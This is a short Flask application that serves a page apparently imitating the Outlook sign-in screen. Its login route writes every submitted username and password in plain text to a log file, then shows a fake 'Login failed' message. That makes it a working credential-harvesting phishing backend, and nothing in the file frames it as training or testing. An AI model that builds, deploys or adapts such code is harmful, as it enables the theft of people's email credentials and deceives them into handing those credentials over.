from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('outlook_modern.html')

@app.route('/modern')
def modern():
    return render_template('outlook_modern.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    with open('logs.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')
    return "Login failed. Please try again later."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
